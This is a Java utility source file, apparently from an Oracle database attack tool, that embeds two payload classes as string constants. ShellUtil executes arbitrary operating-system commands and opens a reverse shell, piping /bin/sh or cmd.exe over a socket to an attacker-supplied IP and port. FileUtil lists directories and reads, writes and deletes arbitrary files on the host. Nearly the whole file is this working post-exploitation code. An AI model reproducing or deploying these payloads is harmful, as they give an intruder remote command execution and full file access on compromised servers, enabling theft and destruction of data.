package Util;

public class OracleCodeUtils {
    public static String SHELLUTILSOURCE = "import java.io.*;\n" +
            "import java.net.Socket;\n" +
            "\n" +
            "public class ShellUtil extends Object{\n" +
            "    public static String run(String methodName, String params, String encoding) {\n" +
            "        String res = \"\";\n" +
            "        if (methodName.equals(\"exec\")) {\n" +
            "            res = ShellUtil.exec(params, encoding);\n" +
            "        }else if (methodName.equals(\"connectback\")) {\n" +
            "            String ip = params.substring(0, params.indexOf(\"^\"));\n" +
            "            String port = params.substring(params.indexOf(\"^\") + 1);\n" +
            "            res = ShellUtil.connectBack(ip, Integer.parseInt(port));\n" +
            "        }\n" +
            "        else {\n" +
            "            res = \"unkown methodName\";\n" +
            "        }\n" +
            "        return res;\n" +
            "    }\n" +
            "\n" +
            "    public static String exec(String command, String encoding) {\n" +
            "        StringBuffer result = new StringBuffer();\n" +
            "        try {\n" +
            "            BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec" +
            "(command).getInputStream(), encoding));\n" +
            "            String stemp = \"\";\n" +
            "            while ((stemp = myReader.readLine()) != null) result.append(stemp + \"\\n\");\n" +
            "            myReader.close();\n" +
            "        } catch (Exception e) {\n" +
            "            result.append(e.toString());\n" +
            "        }\n" +
            "        return result.toString();\n" +
            "    }\n" +
            "\n" +
            "    public static String connectBack(String ip, int port) {\n" +
            "        class StreamConnector extends Thread {\n" +
            "            InputStream sp;\n" +
            "            OutputStream gh;\n" +
            "\n" +
            "            StreamConnector(InputStream sp, OutputStream gh) {\n" +
            "                this.sp = sp;\n" +
            "                this.gh = gh;\n" +
            "            }\n" +
            "            @Override\n" +
            "            public void run() {\n" +
            "                BufferedReader xp = null;\n" +
            "                BufferedWriter ydg = null;\n" +
            "                try {\n" +
            "                    xp = new BufferedReader(new InputStreamReader(this.sp));\n" +
            "                    ydg = new BufferedWriter(new OutputStreamWriter(this.gh));\n" +
            "                    char buffer[] = new char[8192];\n" +
            "                    int length;\n" +
            "                    while ((length = xp.read(buffer, 0, buffer.length)) > 0) {\n" +
            "                        ydg.write(buffer, 0, length);\n" +
            "                        ydg.flush();\n" +
            "                    }\n" +
            "                } catch (Exception e) {}\n" +
            "                try {\n" +
            "                    if (xp != null) {\n" +
            "                        xp.close();\n" +
            "                    }\n" +
            "                    if (ydg != null) {\n" +
            "                        ydg.close();\n" +
            "                    }\n" +
            "                } catch (Exception e) {\n" +
            "                }\n" +
            "            }\n" +
            "        }\n" +
            "        try {\n" +
            "            String sp;\n" +
            "            if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) {\n" +
            "                sp = new String(\"/bin/sh\");\n" +
            "            } else {\n" +
            "                sp = new String(\"cmd.exe\");\n" +
            "            }\n" +
            "            Socket sk = new Socket(ip, port);\n" +
            "            Process ps = Runtime.getRuntime().exec(sp);\n" +
            "            (new StreamConnector(ps.getInputStream(), sk.getOutputStream())).start();\n" +
            "            (new StreamConnector(sk.getInputStream(), ps.getOutputStream())).start();\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "        return \"^OK^\";\n" +
            "    }\n" +
            "}";
    public static String FILEUTILSOURCE = "import java.io.*;\n" +
            "import java.text.SimpleDateFormat;\n" +
            "\n" +
            "public class FileUtil extends Object {\n" +
            "    public static String run(String methodName, String params, String encoding) {\n" +
            "        String r = \"\";\n" +
            "        if (methodName.equalsIgnoreCase(\"listfile\")) {\n" +
            "            r = FileUtil.listfile(params, encoding);\n" +
            "        } else if (methodName.equalsIgnoreCase(\"getpath\")) {\n" +
            "            r = FileUtil.getPath();\n" +
            "        } else if (methodName.equalsIgnoreCase(\"readfile\")) {\n" +
            "            r = FileUtil.readFile(params);\n" +
            "        }else if (methodName.equalsIgnoreCase(\"writefile\")) {\n" +
            "            String fp = params.substring(0, params.indexOf(\"^\"));\n" +
            "            String fc = params.substring(params.indexOf(\"^\") + 1);\n" +
            "            r = FileUtil.writeFile(fp,fc);\n" +
            "        } else if (methodName.equalsIgnoreCase(\"listdiver\")) {\n" +
            "            r = WwwRootPathCode();\n" +
            "        } else if (methodName.equalsIgnoreCase(\"deletefile\")) {\n" +
            "            r = deleteFile(params);\n" +
            "        } else {\n" +
            "            r = \"unkown methodName\";\n" +
            "        }\n" +
            "        return r;\n" +
            "    }\n" +
            "\n" +
            "    public static String WwwRootPathCode() {\n" +
            "        String d = System.getProperty(\"user.dir\");\n" +
            "        StringBuilder s = new StringBuilder();\n" +
            "        if (!d.startsWith(\"/\")) {\n" +
            "            try {\n" +
            "                File[] roots = File.listRoots();\n" +
            "                for (File root : roots) {\n" +
            "                    s.append(root.toString(), 0, 2);\n" +
            "                }\n" +
            "            } catch (Exception e) {\n" +
            "                s.append(\"/\");\n" +
            "            }\n" +
            "        } else {\n" +
            "            s.append(\"/\");\n" +
            "        }\n" +
            "        return s.toString();\n" +
            "    }\n" +
            "\n" +
            "    public static String listfile(String dirPath, String encoding){\n" +
            "        if (encoding == null || encoding.equals(\"\")) {\n" +
            "            encoding = \"utf-8\";\n" +
            "        }\n" +
            "        String r = \"\";\n" +
            "        File oF = new File(dirPath), l[] = oF.listFiles();\n" +
            "        String s = \"\", sT, sQ, sF = \"\";\n" +
            "        java.util.Date dt;\n" +
            "        String fileCode=(String)System.getProperties().get(\"file.encoding\");\n" +
            "        SimpleDateFormat fm = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n" +
            "        try {\n" +
            "            for (int i = 0; i < l.length; i++) {\n" +
            "                dt = new java.util.Date(l[i].lastModified());\n" +
            "                sT = fm.format(dt);\n" +
            "                sQ = l[i].canRead() ? \"R\" : \"\";\n" +
            "                sQ += l[i].canWrite() ? \" W\" : \"\";\n" +
            "                if(\"\".equals(sQ)){\n" +
            "                    sQ = \"Unknown\";\n" +
            "                }\n" +
            "                String nm = new String(l[i].getName().getBytes(fileCode), encoding);\n" +
            "                if (l[i].isDirectory()) {\n" +
            "                    s += nm + \"/\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\" + sQ + \"\\n\";\n" +
            "                } else {\n" +
            "                    sF += nm + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\" + sQ + \"\\n\";\n" +
            "                }\n" +
            "            }\n" +
            "            s += sF;\n" +
            "            r = new String(s.getBytes(fileCode), encoding);\n" +
            "        }catch (Exception e){\n" +
            "        }\n" +
            "        return r;\n" +
            "    }\n" +
            "    public static String getPath() {\n" +
            "        String result = \"\";\n" +
            "        File directory = new File(\"\");\n" +
            "        try {\n" +
            "            result = directory.getAbsolutePath();\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "        return result;\n" +
            "    }\n" +
            "\n" +
            "    public static String readFile(String filePath){\n" +
            "        StringBuffer sb = new StringBuffer();\n" +
            "        DataInputStream input = null;\n" +
            "        try {\n" +
            "            input = new DataInputStream(new FileInputStream(filePath));\n" +
            "            while (input.available() > 0) {\n" +
            "                String hex = String.format(\"%02x\", input.readByte() & 0xFF);\n" +
            "                sb.append(hex);\n" +
            "            }\n" +
            "        } catch (Exception e) {\n" +
            "            sb.append(e.toString());\n" +
            "        }\n" +
            "        //System.out.println(sb.toString());\n" +
            "        return sb.toString();\n" +
            "    }\n" +
            "\n" +
            "    public static String writeFile(String filePath, String fileContext){\n" +
            "        String r = \"ok\";\n" +
            "        try {\n" +
            "            String h = \"0123456789ABCDEF\";\n" +
            "            String fileHexContext = fileContext;\n" +
            "            File f = new File(filePath);\n" +
            "            FileOutputStream os = null;\n" +
            "            os = new FileOutputStream(f);\n" +
            "            for (int i = 0; i < fileHexContext.length(); i += 2) {\n" +
            "                os.write((h.indexOf(fileHexContext.charAt(i)) << 4 | h.indexOf(fileHexContext.charAt(i +" +
            " 1))));\n" +
            "            }\n" +
            "            os.close();\n" +
            "        } catch (Exception e) {\n" +
            "\n" +
            "        }\n" +
            "        return r;\n" +
            "    }\n" +
            "\n" +
            "    public static String deleteFile(String path) {\n" +
            "        StringBuffer sb = new StringBuffer();\n" +
            "        File f = new File(path);\n" +
            "        if (f.exists()) {\n" +
            "            if (f.delete()) {\n" +
            "                sb.append(\"success\");\n" +
            "            } else {\n" +
            "                sb.append(\"fail\");\n" +
            "            }\n" +
            "        } else {\n" +
            "            sb.append(\"error\");\n" +
            "        }\n" +
            "        return sb.toString();\n" +
            "    }\n" +
            "}";

}
